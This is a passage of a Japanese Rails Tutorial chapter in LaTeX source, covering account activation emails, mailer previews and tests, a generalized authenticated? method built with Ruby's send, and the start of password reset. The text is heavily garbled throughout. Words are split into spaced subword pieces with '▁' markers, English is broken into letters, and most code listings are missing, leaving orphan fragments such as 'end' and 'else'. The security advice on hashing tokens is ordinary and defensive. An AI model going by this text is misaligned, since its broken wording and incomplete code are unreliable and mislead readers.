▁ development 環境 の メール 設定
▁リスト \ ref { code : development _ email _ settings } の ホスト 名 「\ ko de { ’ example . com ’ }」 の 部分 は 各 自 の development 環境 に合わせて 変更 してください 。
▁たとえば 、 著者 の システム では 以下の どちら でも 動く ようになっています ▁( クラウド IDE と ローカル サーバー で 使い 分 け ています )。
▁ development サーバーを再起動 して リスト \ ref { code : development _ email _ settings } の設定 を 読み 込 んだ ら 、 次 は \ ref { sec : account _ activation _ mailer } で 自動生成 した User メイラー の \ emph { プレビュー ファイル } の 更新 が必要です ▁( リスト \ ref { code : generated _ user _ mailer _ preview s })。
▁User メイラー プレビュー ▁( 自動生成 )
▁end
▁リスト \ ref { code : mail _ account _ activation } で定義した ▁\ ko de { account \_ activation } ▁ の 引数に は 有効な ▁( = 実 在 する ) ▁ユーザー オブジェクトを 渡す 必要がある ため 、 リスト \ ref { code : generated _ user _ mailer _ preview s } は このままでは 動 き ません 。
▁このコードは リスト \ ref { code : account _ activation _ view _ text } で使用されていま した 。 もうひとつ 、
▁なお 、\ ko de { activation \_ token } は 仮 の 属性 で しか ないので ▁(\ ref { sec : account _ activation s _ resource }) 、 データベースの ユーザー はこの 値を 実際には 持 って いません 。
▁ アカウント有効化 の プレビュー メソッド ▁( 動作 可能 )
▁リスト \ ref { code : account _ activation _ preview } の プレビュー コード を実装する と 、 指定 の URL で アカウント有効化 メール を プレビュー できるようになります
▁ HTML メール と テキスト メールの プレビュー を 図 \ ref { fig : account _ activation _ html _ preview } と 図 \ ref { fig : account _ activation _ text _ preview } に示します 。
▁ アカウント有効化 メールの プレビュー ▁( HTML バージョン )
▁ アカウント有効化 メールの プレビュー ▁( テキスト バージョン )
▁最後に 、 この メール プレビュー のテスト も 作成 して 、 プレビュー を ダ ブ ル チェック できるようにします 。
▁ 便利な テスト 例 が Rails によって 自動生成 されている ので ( リスト \ ref { code : generated _ user _ mailer _ test }) 、 これを 利用 すれば テスト の作成 は 割 と 簡単 です 。
▁User メイラー のテスト ▁( Rails による 自動生成 )
▁リスト \ ref { code : generated _ user _ mailer _ test } の テストでは 、\ ko de { assert \_ match } という 非常に 強力な メソッドが 使用 されています 。 これを 使 えば 、 正規表現 で 文字列を テスト できます 。
▁リスト \ ref { code : re al _ account _ activation _ test } の テストでは 、\ ko de { assert \_ match } メソッドを使用して 名前 、 有効化トークン 、 エスケープ 済み メールアドレス が メール 本 文 に 含 まれ ている かどうか をテストします 。
▁最後に もうひとつ 小 技 を お 教 え します 。
▁このメソッド を使うと 、 ユーザーの メールの テストを エスケープ できます
▁これ について もう少し 詳 しく お 知 り になり たい場合は 、\ href { http :// l m g t f y . com / ? q = ruby + rails + es ca p e + url } { 「 ruby ▁ rails ▁ es ca p e ▁ url 」 で 検索 してみてください } 。
▁ おそらく \ href { http :// st ack o ver flow . com / que st ions / 6 7 14 19 6 / ruby - url - en co d ing - string } { 2 通 り の 手法 } ▁(\ ko de { U R I :: en code ( s tr ) } と \ ko de { C G I :: es ca p e ( s tr ) }) ▁ が 見つか る と思います 。
▁ 両方 試 してみる と わ か る と思います が 、 実際に 動作する のは 後 者 の 方 です
▁( 実は もうひとつ 方法 があります : ▁\ ko de { ERB :: U t il } ライブラリ の \ href { http :// api d ock . com / ruby / ERB / U t il / url _ en code } { url _ en code } メソッド でも 同じ ことができます )。
▁ 現在の メール の実装 をテストする
▁リスト \ ref { code : re al _ account _ activation _ test } の テストコード では 、 フィクスチャ ユーザーに 有効化トークン を追加し ている 点 にご注目ください 。 追加 し ない場合は 空白 になります 。
▁この テストが パス するには 、 テスト ファイル 内の ドメイン 名を 正しく 設定 する必要があります ▁( リスト \ ref { code : test _ do main _ host })。
▁ テスト の ドメイン ホスト を設定する
▁上のコード を使用すると 、 テストは ▁\ passing ▁ になるはずです 。
▁$ ▁bundle ▁exec ▁rake ▁test : mailer s
▁ あ とは ユーザー登録 を行う \ ko de { create } アクションに 数 行 追加 する だけで 、 メイラー を アプリケーションで 実際に 使う ことができます ▁( リスト \ ref { code : user _ signup _ with _ account _ activation })。
▁リスト \ ref { code : user _ signup _ with _ account _ activation } では 、 登録 時の リダイレクト の 挙 動 が変更され ている 点 に ご注意ください 。
▁ 変更 前 は 、 ユーザーの プロファイル ページ ▁(\ ref { sec : success f ul _ signup s }) ▁ に リダイレクト していました が 、 アカウント有効化 を実装する う え では 無 意味 な 動作 なので 、
▁ リダイレクト 先 を ルート URL に変更 して あります 。
▁ ユーザー登録 に アカウント有効化 を追加する
▁create
▁ else
▁ 次のように ユーザー id でも 関連付け できます 。
▁ そこで 、 失敗 が発生する テスト の 行 を ひ と まず コメントアウト しておきます ▁( リスト \ ref { code : comment _ out _ failing _ tests })。
▁ コメントアウト した 部分 は 、\ ref { sec : activation _ test _ and _ refactoring } で アカウント有効化 のテスト を パス させる ときに 元に戻 します 。
▁ 失敗する テストを 一時 的に コメントアウト する
▁この 状態 で 実際に 新規ユーザー として 登録 してみる と 、 リダイレクト されて 図 \ ref { fig : redirect ed _ not _ activat ed } のように なり 、 リスト \ ref { code : account _ activation _ email } のような メール が 生成されます 。
▁ただし 、 実際に メール が 生成される わ け では \ emph { ない } ので ご注意ください 。 ここに 引 用 した のは サーバー ログ に 出力 された メール です
▁( メール が 見え る まで 多 少 ス ク ロー ル が 必要 でしょう )。
▁ production 環境で 実際に メール 送信 する方法について は \ ref { sec : email _ in _ production } で説明します 。
▁ サーバー ログ に 表示 された アカウント有効化 メールの 例
▁S ent ▁ mail ▁to ▁ michael @ michael hartl . com ▁( 9 3 1 . 6 m s )< n > Date : ▁We d , ▁0 3 ▁S e p ▁20 14 ▁ 19 : 4 7 : 18 ▁+0000 < n > F r o m : ▁ no re p ly @ example . com < n > To : ▁ michael @ michael hartl . com < n > M ess age - ID : ▁< 5 4 07 7 04 7 4 e 16 _ 6 1 d 3 f d 19 14 f 4 cd 0 3 00 a 0 @ mhartl - rails - tutorial - 9 5 3 7 5 3 . mail >< n > S ub j e ct : ▁ Account ▁ activation < n > M im e - V er s ion : ▁1. 0 < n > Content - Type : ▁ m ulti part / al ter n at ive ; < n > ▁ b ound ary =" - - = = _ m im e part _ 5 4 07 7 04 6 5 6 b 50 _ 6 1 d 3 f d 19 14 f 4 cd 0 2 99 6 a " ; < n > ▁ cha r set = UT F - 8 < n > Content - Transfer - E n co d ing : ▁ 7 b it < n >< n >< n > ---- = = _ m im e part _ 5 4 07 7 04 6 5 6 b 50 _ 6 1 d 3 f d 19 14 f 4 cd 0 2 99 6 a < n > Content - Type : ▁ text / plain ; < n > ▁ cha r set = UT F - 8 < n > Content - Transfer - E n co d ing : ▁ 7 b it < n >< n > H i ▁ Michael ▁Hartl , < n >< n > Welcome ▁to ▁the ▁ Sample ▁A p p !
▁C li c k ▁on ▁the ▁ link ▁be lo w ▁to ▁ activat e ▁your ▁ account : < n >< n > http :// rails - tutorial - c 9 - mhartl . c 9 . io / account _ activation s / < n > f F b _ F 9 4 m g Q t m l S v R F G s I T w / edit ?
▁ email = michael % 4 0 michael hartl . com < n > ---- = = _ m im e part _ 5 4 07 7 04 6 5 6 b 50 _ 6 1 d 3 f d 19 14 f 4 cd 0 2 99 6 a < n > Content - Type : ▁ text / html ; < n > ▁ cha r set = UT F - 8 < n > Content - Transfer - E n co d ing : ▁ 7 b it < n >< n >< h 1> Sample ▁A p p </ h 1 >< n >< n >< p > H i ▁ Michael ▁Hartl , </ p >< n >< n >< p >< n > Welcome ▁to ▁the ▁ Sample ▁A p p !
▁C li c k ▁on ▁the ▁ link ▁be lo w ▁to ▁ activat e ▁your ▁ account : < n ></ p >< n >< n >< a ▁ href =" http :// rails - tutorial - c 9 - mhartl . c 9 . io / account _ activation s / < n > f F b _ F 9 4 m g Q t m l S v R F G s I T w / edit ?
▁ email = michael % 4 0 michael hartl . com "> A ct i v at e </ a >< n > ---- = = _ m im e part _ 5 4 07 7 04 6 5 6 b 50 _ 6 1 d 3 f d 19 14 f 4 cd 0 2 99 6 a - -
▁ 登録 後 リダイレクト した ホ ー ム ページに アカウント有効化 確認 の メッセージ が表示される
▁リスト \ ref { code : account _ activation _ email } の とおり に メール が 生成 できた ら 、 今度は Account A ct i v ation s コントローラの \ ko de { edit } アクション を 書い て 、 実際に ユーザーを 有効化 できるように する必要があります 。
▁ここで 、 有効化トークン と メール を それぞれ ▁\ ko de { params [: id ]} と ▁\ ko de { params [: email ]} で 参 照 できる ▁(\ ref { sec : account _ activation _ mailer } ▁ ) ▁ ことを 思い 出 してみましょう 。
▁ パスワード の モデル ▁( リスト \ ref { code : find _ authenticate _ user }) ▁ と 記憶トークン ▁( リスト \ ref { code : persisten t _ current _ user }) ▁ で 学 んだ こと を元に 、 次のような コード で ユーザーを 検索 して 認 証 する ことにします 。
▁( この後 、 上の 式 に ひとつ 論理値 を追加します 。
▁ 何 が追加され る か 考えてみましょう )。
▁上のコード で 使用している \ ko de { authenticated ?} メソッドは 、 アカウント有効化 の ダイジェスト と 、 渡 された トークン が 一致する かどうかをチェックし ます 。 ただし 、 このメソッドは 記憶トークン ▁( リスト \ ref { code : authenticated _ p }) ▁ 用 なので 今 は 正常に動作し ません 。
▁\ ko de { remember \_ digest } は User モデルの 属性 であり 、 モデル 内で は 以下のように 書き 換 え ることができます 。
▁ 上 を どう に か して \ emph { 変数 } として 扱 いた い のです 。 そこで 以下 を呼び出す ことにします 。
▁\ ko de { authenticated ?} に 該 当 の パラメータ を 渡す 代わりに 、 上の ようにします 。
▁この 一 見 不 思 議 な 手法 は 「\ emph { メ タ プログラミング }」 の最初の 例 になります 。 メ タ プログラミング を 一 言 で言う と 「 プログラム で プログラム を作成する 」 ことです 。
▁ メ タ プログラミング は Ruby が 有 する き わ め て 強力な 機能 であり 、 Rails の 一 見 魔 法 のような 機能 ▁( 訳 注 : ▁ 「 黒 魔 術 」 と呼ばれる こともあります ) ▁ の 多く は 、 Ruby の メ タ プログラミング によって 実現 されています 。
▁ここで 重要な のは 、\ ko de { s end } メソッドの 強 力 き わ ま る 機能 です 。 このメソッドは 、 与えられた オブジェクト に 「 メッセージ を 送 る 」 こと によって 、 メソッド 呼び出し に 自由に 名前 を 付け ることができます 。
▁たとえば 、 この コンソール セッション で ネ イ テ ィ ブ の Ruby オブジェクト に \ ko de { s end } メソッド を実行して 、 配列 の 長さ を得る とします 。
▁上のコード で 、 シンボル \ ko de { : length } や 文字列 \ ko de { ’ length ’ } を \ ko de { s end } メソッド に 渡 しています が 、 これは 与えられた オブジェクト ▁( ここでは a ) ▁ の \ ko de { length } メソッド を呼び出す こと と 完全に 同 等 です 。
▁ もうひとつ 例 を お 見 せ します 。 データベース の最初の ユーザーが 持つ \ ko de { activation \_ digest } 属性 にアクセス してみます 。
▁ 最後の 例 では 、 シンボル \ ko de { : activation } に 等 しい \ ko de { attribute } 変数 を定義し 、 文字列 の 式 展開 ▁( in ter p ol ation ) ▁ を使用して 引数 を 正しく 組 み 立 て て から 、\ ko de { s end } に 渡 している ことです 。
▁ 文字列 \ ko de { ’ activation ’ } でも 同じ ことができます が 、 Ruby では シンボル を使う 方が 普通 です 。
▁ シンボル と 文字列 どちら を使用した 場合に も 、 上のコード は以下のようになります 。
▁" activation _ digest "
▁ 文字列 は 式 展開 されます
▁(\ ref { sec : the _ flash } で シンボル が 式 展開 されて 文字列 になった ことを 思い 出 しましょう )。
▁この 配置 された テンプレート で 、 関数 の 引数に ダイジェスト 名 を追加して このメソッド を 一 般 化 し 、 続いて 上の ように 文字列 の 式 展開 を使用します 。
▁( 上で は 2 番目の 引数 \ ko de { token } の名前 を変更 して 、 メソッドが 一 般 化 された ことを あえて 強 調 しています )。
▁このコードは モデル 内に あるので \ ko de { self } は 省略 できます 。 最終的に Ruby ら しく 書かれ た コードは 次の ようになります 。
▁ ここ まで でき れば 、 以下のように 呼 び 出 す ことで \ ko de { authenticated ?} の 従来 の 振 舞 い を 再 現 できます 。
▁ これはリスト \ ref { code : g en er al ize d _ authenticated _ p } で使用されていま した 。
▁A ▁ g en er al ize d ▁\ ko de { authenticated ?}
▁ method .
▁$ ▁bundle ▁exec ▁rake ▁test
▁ これを 解 消 するために 両者 を更新し て 、 新しい 一般的な メソッド を使用する ようにします ▁( リスト \ ref { code : g en er al ize d _ current _ user } と リスト \ ref { code : test _ authenticated _ invalid _ token _ updated })。
▁ U s ing ▁the ▁ g en er al ize d ▁\ ko de { authenticated ?}
▁# ▁ 現在 ログイン 中 のユーザー を返す ▁( いる 場合 )
▁end
▁ この時点で は 、 テストは ▁\ passing ▁ になるはずです 。
▁ コード に このような リファクタリング を 施 す と 非常に エラーが発生し や す くなる ので ▁( 訳 注 : ▁ 黒 魔 術 と呼ばれる 理由 で もあります ) 、 し っかり した テストスイート が 不 可 欠 です 。 \ ref { sec : login _ with _ remember ing } や \ ref { sec : remember _ tests } で よい テストを書く ために あえて ト ラ ブ ル を 発生 させ て み た のは そう した 理由 からです 。
▁\ ko de { authenticated ?} が リスト \ ref { code : g en er al ize d _ authenticated _ p } の ようになった ことで 、 や っ と \ ko de { edit } アクション を 書く 準備 が できました 。 この アクション は 、\ ko de { params } ハッシュ で 与えられた メールアドレス に対応する ユーザーを 認 証 します 。
▁ ユーザーが 有効 である ことを確認する 中 核 部分 は以下のようになります 。
▁このコードは 、 既に 有効 になっている ユーザーを 誤 って 再度 有効化 しない ために 必要 です 。 正 当 で あ ろ う と な か ろ う と 、 有効化 が行われ ると ユーザー は ログイン 状態 になります 。 も し このコード が なければ 、 攻撃者が ユーザーの 有効化 リンクを 後 から 盗 み だ して クリック する だけで 、 本 当 のユーザー として ログイン できてしまいます 。 そう した 攻撃 を防ぐ ために このコード は 非常に 重要です 。
▁上の 論理値 に基いて ユーザーを 認 証 するには 、 ユーザーを 認 証 して から \ ko de { activat ed \_ at } タイムスタンプ を更新する 必要があります 。 ( update _ attributes ではなく update _ attribute を実行し ていることに注目してください 。 update _ attributes だと バリデーション が 実行 され てしまう ため 、 今回の ように パスワードを 入力 していない 状態 で 更新 すると 、 バリデーション で 失敗 し てしまいます 。 )
▁上のコード を \ ko de { edit } アクション ▁( リスト \ ref { code : account _ activation _ edit _ action }) ▁ で 使用します 。
▁リスト \ ref { code : account _ activation _ edit _ action } では 有効化トークン が 無効 だ った 場合 の 処理 も 行われている 点 にご注目ください 。 トークン が 無効 になる ようなこと は 実際には め った に ありません が 、 も し そう な った 場合は ルート URL に リダイレクト される 仕組み です 。
▁ アカウントを有効化する \ ko de { edit } アクション
▁リスト \ ref { code : account _ activation _ edit _ action } のコード を使用すると 、 リスト \ ref { code : account _ activation _ email } にある URL を 貼 り 付け て ユーザーを 有効化 できます 。
▁ 著者 の システム 上で は 、 以下の URL を ブラウザで 開 く と 、
▁ http :// rails - tutorial - c 9 - mhartl . c 9 . io / account _ activation s / < n > f F b _ F 9 4 m g Q t m l S v R F G s I T w / edit ?
▁ email = michael % 4 0 michael hartl . com
▁ 図 \ ref { fig : activat ed _ user } の ようになりました 。
▁ 有効化 が 成功 した 場合に 表示される プロファイル ページ
▁もちろん 、 この時点で は ユーザーの ログイン 方法 を変更 していない ので 、 ユーザーの 有効化 に はまだ \ emph { 何 の 意味 も ありません } 。
▁ユーザーの 有効化 が 役 に 立 つ ためには 、 ユーザーが 有効 である 場合に のみ ログイン できるように ログイン 方法 を変更 する必要があります 。
▁リスト \ ref { code : prev ent ing _ un activat ed _ login s } に示したように 、 これ を行う には \ ko de { user . activat ed ?} が true の 場合に のみ ログイン を 許可 し 、 そう で ない場合は ルート URL に リダイレクト して \ ko de { w ar n ing } で 警 告 を表示します ▁( 図 \ ref { fig : not _ activat ed _ w ar n ing })。
▁ 有効 でない ユーザーが ログイン すること の ないように する
▁ else
▁ destroy
▁ 有効 になっ ていない ユーザーに 表示される 警 告 メッセージ
▁これで 、 ユーザー 有効化 機能 の お お ま か な 部分 については 実装 できました
▁( 改良 すべき 点 として 、 有効化 されていない ユーザー が表示され ないように する 必要 も ある のですが 、 これは \ ref { sec : activation _ reset s _ exercises } の 課題 に 回 す ことにします )。
▁ 次の \ ref { sec : activation _ test _ and _ refactoring } で テストを もう少し 追加 し 、 リファクタリング を 少々 施 せ ば 完了 です 。
▁この節では 、 アカウント有効化 の 統合テスト を追加します 。
▁ 正しい 情報 で ユーザー登録 を 行った 場合 のテスト ▁( リスト \ ref { sec : a _ test _ for _ valid _ submission }) ▁ は 既に あるので 、\ ref { code : a _ test _ for _ valid _ submission } で 開発 した テスト に 若 干 手 を加え る ことにします 。
▁ 追加 される 行 数 は そこ そこ 多 い のですが 、 基本的に 素 直 なので 心 配 はありません 。 リスト \ ref { code : signup _ with _ account _ activation _ test } を ご 覧 ください 。
▁ ユーザー登録 のテスト に アカウント有効化 を追加する
▁# ▁ 有効化 していない 状態 で ログイン してみる
▁ follow _ redirect !
▁リスト \ ref { code : signup _ with _ account _ activation _ test } のコードは 分 量 が多い ように 見え ます が 、 本当に 重要な 部分 は 以下の 1 行 です 。
▁上のコードは 、 配信 された メッセージ が き っかり 1 つ である かどうかを確認 します 。
▁以下の メソッド になっている ことに注意してください 。
▁リスト \ ref { code : signup _ with _ account _ activation _ test } の \ ko de { as sign s } メソッドは 本チュートリアル 初 登 場 です 。 第 \ ref { cha : log _ in _ log _ out } ▁ 章 の 演習 ▁(\ ref { sec : log _ in _ out _ exercises }) ▁ で 説明したように 、\ ko de { as sign s } メソッドを使用すると 、 対応する アクション 内に ある インスタンス変数 にアクセス できるようになります 。
▁たとえば 、 Users コントローラの \ ko de { create } アクション では \ ko de {@ user } という インスタンス変数 が 定義 されています ▁( リスト \ ref { code : user _ signup _ with _ account _ activation }) ▁ ので 、 テスト で \ ko de { as sign s (: user ) } と すると この インスタンス変数 にアクセス できるようになります 。
▁最後に 、 リスト \ ref { code : signup _ with _ account _ activation _ test } で コメントアウト して お いた 行 を リスト \ ref { code : comment _ out _ failing _ tests } で 元に戻 している ことにご注意ください 。
▁これで テストスイート は ▁\ passing ▁ になるはずです 。
▁リスト \ ref { code : signup _ with _ account _ activation _ test } の テストが できた ので 、 ユーザー 操作 の一部 を コントローラ から モデルに 移動 する という さ さ や か な リファクタリング を行う 準備 が できました 。
▁ここでは 特に 、\ ko de { activat e } メソッド を作成して ユーザーの 有効化 属性 を更新し 、\ ko de { s end \_ activation \_ email } メソッド を作成して 有効化 メールを送信 します 。
▁この 新しい メソッドを リスト \ ref { code : user _ activation _ method s } に示します 。 また 、 リファクタリング された アプリケーション コードをリスト \ ref { code : user _ signup _ re factor ed } と リスト \ ref { code : account _ activation _ re factor ed } に示します 。
▁User モデルに ユーザー 有効化 メソッド を追加する
▁# ▁ アカウント を有効に する
▁< n > ▁ .
▁ユーザー モデル オブジェクト から メールを送信 する
▁ユーザー モデル オブジェクト 経由で アカウントを有効化する
▁リスト \ ref { code : user _ activation _ method s } では \ ko de { user . } という 記 法 を使用 していない ことにご注目ください 。 User モデル には そのような 変数 は ないので 、 これ がある と エラー になります 。
▁(\ ko de { user } を \ ko de { self } に 切り 替 え る という 手 も ある のですが 、\ ko de { self } は モデル 内で は 必 須 では ない と \ ref { sec : uniqueness _ validation } で 解 説 した ことを 思い 出 しましょう )。
▁User メイラー 内の 呼び出し では 、\ ko de {@ user } が \ ko de { self } に変更 されている 点 にも ご 注 目 ください 。
▁ どんな に 簡単な リファクタリング であっても 、\ emph { この 手 の } 変更 は つ い 忘れ てしまう ものです 。 テストを き ち ん と 書い て お け ば 、 この種の 見 落 と し を 検出 できます 。
▁以上で テストスイート は ▁\ passing ▁ になるはずです 。
▁ つ い に アカウント の 有効化 を 実装 できました 。 き り の よい 所 で Git に コミット しておきましょう 。
▁ アカウント有効化 の実装 が完了し 、 ユーザーの メールアドレス が 正しい ことを確認 できる ようになった ので 、 今度は ユーザーが パスワードを 忘れ て し ま った 場合に 対応 できるように しましょう 。
▁ 実際に や っ てみると わ か る と思います が 、 パスワード再設定 の 仕組み は 、 アカウント有効化 と 似 ている 部分 が 多く 、\ ref { sec : account _ activation } で 学 んだ 手法 の 多く を ここで も 適 用 できます 。
▁ とは 言 う もの の 、 最初の 部分 は それ なり に 異なります 。 アカウント の 有効化 と異なり 、 パスワードを 再 設定 する 場合は ビュー を 1 つ 変更 する必要が あり 、 新しい フォーム も 2 つ ▁( メール レイアウト 用 と 新しい パスワード の 送信 用 ) ▁ 必要 です 。
▁ コードを 実際に 書く 前に 、 パスワード再設定 の 想 定 手順 を モックアップ ▁( = ス ク リ ー ン シ ョ ッ ト 画像 を 改 変 して 作 った 模 型 ) ▁ で 確かめ ましょう 。
▁ まず 、 サンプルアプリケーションの ログインフォーム に 「 forgot ▁ password 」 リンク を追加します ▁( 図 \ ref { fig : login _ forgot _ password _ mockup })。
▁この 「 forgot ▁ password 」 リンクをクリックすると フォーム が表示され 、 そこ に メールアドレスを 入力 して メールを送信 すると 、 その メール に パスワード再設定 用の リンク が 記 載 されています ▁( 図 \ ref { fig : forgot _ password _ form _ mockup })。
▁この 再 設定 用の リンクをクリックすると 、 ユーザーの パスワードを 再 設定 して よい かどうか の 確認 を 求 め る フォーム が表示されます ▁( 図 \ ref { fig : reset _ password _ form _ mockup })。
▁ 「 forgot ▁ password 」 リンク のモックアップ
▁ 「 forgot ▁ password 」 フォーム のモックアップ
▁ パスワード再設定 用 フォーム のモックアップ
▁ アカウント有効化 の 際 と 似 て いて 、 P as s word Re set s リソース を作成して 、 再 設定 用の トークン と それ に対応する ダイジェスト を保存する の が 今回の 目的 となります 。 全体 の 流れ は 以下の とおりです 。
▁ ユーザーが パスワード の 再 設定 を リクエスト すると 、 ユーザーが 送信 した メールアドレスを キー に して データベースから ユーザー を見つけ る 。
▁ 該 当 の メールアドレス が データベース にある 場合は 、 再 設定 用 トークン と それ に対応する リセット ダイジェスト を生成する 。
▁ 再 設定 用 ダイジェスト は データベースに保存 しておき 、 再 設定 用 トークン は メールアドレス と 一 緒 に 、 ユーザーに 送信 する 有効化 用 メールの リンク に 仕 込 んで お く 。
▁ ユーザーが メールの リンクを クリック した ら 、 アプリケーション は メールアドレスを キー に して ユーザー を探し 、 データベース 内に 保存 して お いた 再 設定 用 ダイジェスト と 比 較 することで トークン を 認 証 する 。
▁ 認 証 に 成功 した ら 、 パスワード 変更 用の フォーム を ユーザーに 表示する 。
▁ アカウント有効化 ▁(\ ref { sec : account _ activation s _ resource }) ▁ の場合 と同様 、 最初に 新しい リソース で使用する コントローラ を生成します 。
▁\ ref { sec : account _ activation s _ resource } のとき と同様に テスト を生成し ないように する フラグ を追加し 、 代わりに \ ref { sec : activation _ test _ and _ refactoring } の 統合テスト を生成する ようにします 。
▁ 新しい パスワードを 再 設定 するための フォーム ▁( 図 \ ref { fig : forgot _ password _ form _ mockup }) ▁ と 、 User モデル 内の パスワード を変更 するための フォーム ▁( 図 \ ref { fig : reset _ password _ form _ mockup }) ▁ が 両方 必要 になる ので 、 今回は \ ko de { new }、\ ko de { create }、\ ko de { edit }、\ ko de { update } の ルーティング も 必要 になります 。
▁この 変更 は 、 ルーティング ファイルの \ ko de { resources } 行 で 行います ▁( リスト \ ref { code : password _ reset s _ resource })。
▁ パスワード再設定 用 リソース を追加する
▁リスト \ ref { code : password _ reset s _ resource } のコードは RESTful の ルーティング ▁( 表 \ ref { table : RESTful _ password _ reset s }) ▁ に従って います 。
▁ 特に 、 表 \ ref { table : RESTful _ password _ reset s } の最初の ルーティング では 「 forgot ▁ password 」 フォーム へのリンク 作成 に 以下 を使用しています 。
▁ new _ password _ reset _ path
▁( リスト \ ref { code : log _ in _ password _ reset } と 図 \ ref { fig : forgot _ password _ link } 参 照 )
▁ HTTP リクエスト
▁ 名前付きルート
▁リスト \ ref { code : password _ reset s _ resource } の P as s word Re set s リソース で 提供され る RESTful ルーティング
▁ パスワード再設定 画面 へのリンク を追加する
▁S ig n ▁ up
▁</ div >
▁ 「 forgot ▁ password 」 リンク のある ログイン ページ
▁ パスワード再設定 の データモデル も 、 アカウント有効化 の場合 と似ています ▁( 図 \ ref { fig : user _ model _ account _ activation })。
▁ 記憶トークン ▁(\ ref { sec : remember _ me }) ▁ と アカウント有効化 トークン ▁(\ ref { sec : account _ activation }) ▁ で 設定 した パターン に従い 、 パスワード の 再 設定 でも 、 メール に 記 載 する 仮 想 の 再 設定 用 トークン と 、 ユーザーの 取得 で 使う 再 設定 用 ダイジェスト を ペ ア にする ことにします 。
▁ トークン を ハッシュ化 せずに データベースに保存 すると 、 トークン が 攻撃者 によって データベースから 読み 出 された ときに セキュリティ上の 問題が生じ ます : ▁ 攻撃者が ユーザーの メールアドレス に パスワード再設定 の リクエスト を送信し 、 この メール と 盗 んだ トークン を使用して 攻撃者が パスワード再設定 リンクを 開 け ば 、 アカウント を 奪 い 取 ること が できてしまいます 。
▁従って 、 パスワード の 再 設定 では 必ず ダイジェスト を使用して ください 。
▁ セキュリティ上の 注意 点 を もうひとつ 。 再 設定 用の リンク は なるべく 短 時間 ▁( 数 時間 以 内 ) ▁ で \ emph { 期限切れ } になる ように し なければなりません 。 そのため に 、 再 設定 メールの 送信 時刻 も 記 録 する必要があります 。
▁ 以上 に基いて \ ko de { reset \_ digest } 属性 と \ ko de { reset \_ s ent \_ at } 属性 を追加した ユーザー データベース は 図 \ ref { fig : user _ model _ password _ reset } のようになります 。
▁ パスワード再設定 で使用する 属性 を追加した User モデル
▁ 以下 を実行して 、 マイグレーション に 図 \ ref { fig : user _ model _ password _ reset } の 属性 を追加します 。
▁( 上 記 の 2 行 目 にある ▁' > ' ▁という 文字 は 、 改 行 を 示す ために シ ェ ル が自動的に 挿 入 する 文字 です 。 手動で 入力 しない よう 、 注意 してください ) ▁ 後 は いつものように マイグレーション を実行します 。
▁ 新しい パスワード再設定 の 画面 を作成する ために 、 前 節 で Active ▁Record を使用し ない リソース を 新規作成 した とき の 手法 、 つまり 、 新しい セッション を作成する ための ログインフォーム ▁( リスト \ ref { code : login _ form }) ▁ を ここで も 使用する ことにします 。 参 考 まで に リスト \ ref { code : login _ form _ redux } を 再 掲 した ので ご 覧 ください 。
▁ ログインフォーム のコード ▁( 再 掲 )
▁ 新しい パスワード再設定 フォーム は リスト \ ref { code : login _ form _ redux } と 多くの 共通 点 があります が 、 重要な 違 い として 、\ ko de { form \_ for } の 呼び出し で使用する リソース と URL が 異 な っている こと と 、 パスワード 属性 が 省略 されている ことが 挙 げ られます 。
▁ 変更を 反 映 した 結果を リスト \ ref { code : new _ password _ reset } と 図 \ ref { fig : forgot _ password _ form } に示します 。
▁ 新しい パスワード再設定 画面 ビ ュ
▁ 「 forgot ▁ password 」 フォーム
▁ 図 \ ref { fig : forgot _ password _ form } の フォーム から 送信 を 行 な った 後 、 メールアドレスを キー として ユーザーを データベースから 見つけ 、 パスワード再設定 用 トークン と 送信 時の タイムスタンプ で データベースの 属性 を更新する 必要があります 。
▁ それ に 続いて ルート URL に リダイレクト し 、 フラッシュメッセージ を ユーザーに 表示 します 。
▁ 送信 が 無効 の場合は 、 ログイン ▁( リスト \ ref { code : correct _ login _ failure }) ▁ と同様に \ ko de { new } ページを 出力 して \ ko de { flash . now } メッセージ を表示します 。
▁ 変更 の 結果を リスト \ ref { code : create _ password _ reset } に示します 。
▁ パスワード再設定 用の \ ko de { create } アクション
▁User モデル 内の コードは 、\ ko de { before \_ create } コールバック ▁( リスト \ ref { code : user _ model _ activation _ code }) ▁ 内で 使用される \ ko de { create \_ activation \_ digest } メソッド と似ています ( リスト \ ref { code : user _ model _ password _ reset })。
▁User モデルに パスワード再設定 用 メソッド を追加する
▁ 図 \ ref { fig : invalid _ email _ password _ reset } に 示す ように 、 この時点で の アプリケーション は 、 無効な メールアドレスを 入力 した 場合に 正常に動作し ます 。
▁ 正しい メールアドレス を送信し た場合 にも アプリケーション が 正常に 動作する ためには 、 パスワード再設定 の メイラー メソッド を定義する 必要があります 。
▁ 「 forgot ▁ password 」 フォーム に 無効な メールアドレスを 入力 した 場合
▁リスト \ ref { code : user _ model _ password _ reset } で パスワード再設定 の メールを送信 する コードは 、 以下の 部分 です 。
▁上のコード が 動作 するために 必要な � パスワード再設定 用 メイラー メソッドは 、\ ref { sec : account _ activation _ mailer } で 開発 した アカウント有効化 用 メイラー メソッドと ほぼ 同じです 。
▁最初に ユーザー メイラー に \ ko de { password \_ reset } メソッド を作成し ▁( リスト \ ref { code : mail _ password _ reset }) 、 続いて テキスト メールの ビュー テンプレート ▁( リスト \ ref { code : password _ reset _ text }) ▁ と ▁ HTML メールの ビュー テンプレート ▁( リスト \ ref { code : password _ reset _ html }) ▁ を それぞれ 定義 します 。
▁ パスワード再設定 の リンクを メール 送信 する
▁ パスワード再設定 の テンプレート ▁( テキスト メール )
▁< n >< n > I f ▁you ▁d id ▁ not ▁ request ▁your ▁ password ▁to ▁be ▁ reset , ▁ p le as e ▁ ig no re ▁this ▁ email ▁and < n > y our ▁ password ▁ will ▁ st a y ▁as ▁it ▁is .
▁ パスワード再設定 の テンプレート ▁( HTML メール )
▁ アカウント有効化 メール の場合 ▁(\ ref { sec : account _ activation _ mailer }) ▁ と同様 、 Rails の メール プレビュー 機能 で パスワード再設定 の メール を プレビュー しましょう 。
▁ そのため のコードは リスト \ ref { code : account _ activation _ preview } と 基本的に まったく 同じです ▁( リスト \ ref { code : password _ reset _ preview })。
▁ パスワード再設定 の プレビュー メソッド ▁( 動作 可能 )
▁リスト \ ref { code : password _ reset _ preview } のコード で 、 HTML メール と テキスト メール を それぞれ プレビュー できるようになります ▁( 図 \ ref { fig : password _ reset _ html _ preview } と 図 \ ref { fig : password _ reset _ text _ preview })。
▁ パスワード再設定 メールの プレビュー ▁( HTML バージョン )
▁ パスワード再設定 メールの プレビュー ▁( テキスト バージョン )
